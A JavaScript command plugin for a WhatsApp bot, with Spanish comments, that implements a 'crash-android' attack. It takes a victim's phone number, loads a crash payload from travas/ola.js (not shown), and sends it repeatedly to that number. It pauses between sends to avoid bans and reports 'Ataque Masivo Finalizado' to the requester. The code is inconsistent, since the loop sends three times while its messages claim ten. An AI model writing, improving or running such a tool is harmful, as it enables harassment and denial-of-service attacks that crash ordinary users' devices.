import fs from 'fs';
import path from 'path';

const crashAndroidMisa = {
    name: 'crash-android',
    alias: ['ca', 'crash', 'ola', 'multi-crash'],
    category: 'tools',
    noPrefix: true,
    isOwner: false,

    run: async (conn, m, { args, command }) => {
        try {
            const chat = m.key.remoteJid;

            if (!args[0]) {
                const textoUso = `✧ ‧₊˚ *MISA CRASH x10* ୧ֹ˖ ⑅ ࣪⊹\n\n✰ \`Uso\`: ${command} [número]`;
                return await conn.sendMessage(chat, { text: textoUso }, { quoted: m });
            }

            const num = args[0].replace(/[^0-9]/g, '');
            if (!num || num.length < 8) {
                return await conn.sendMessage(chat, { text: '❌ *Número inválido.*' }, { quoted: m });
            }
            const targetJid = `${num}@s.whatsapp.net`;

            const pathTrava = path.join(process.cwd(), 'travas', 'ola.js');
            if (!fs.existsSync(pathTrava)) {
                return await conn.sendMessage(chat, { text: '❌ No encontré: `travas/ola.js`' }, { quoted: m });
            }

            const contenidoTrava = fs.readFileSync(pathTrava, 'utf8');

            // 1. Reacción de inicio de ataque
            await conn.sendMessage(chat, { react: { text: '🚀', key: m.key } });

            // 2. Bucle de envío (10 veces)
            for (let i = 1; i <= 3; i++) {
                try {
                    // Enviamos la carga
                    await conn.sendMessage(targetJid, { text: contenidoTrava });
                    
                    // Log en consola para que veas el progreso en SkyUltraPlus
                    console.log(`[MISA-BOT] Carga ${i}/10 enviada a ${num}`);

                    // Esperamos 2 segundos entre cada envío para evitar el baneo/bloqueo
                    if (i < 10) await new Promise(resolve => setTimeout(resolve, 2000));
                    
                } catch (e) {
                    console.error(`Error en el envío ${i}:`, e);
                }
            }

            // 3. Confirmación final
            await conn.sendMessage(chat, { react: { text: '💀', key: m.key } });
            await conn.sendMessage(chat, { 
                text: `✅ *Ataque Masivo Finalizado*\n> Se enviaron 10 ráfagas de 'ola.js' a @${num}`,
                mentions: [targetJid]
            }, { quoted: m });

        } catch (err) {
            console.error('Error en crash-android masivo:', err);
        }
    }
};

export default crashAndroidMisa;
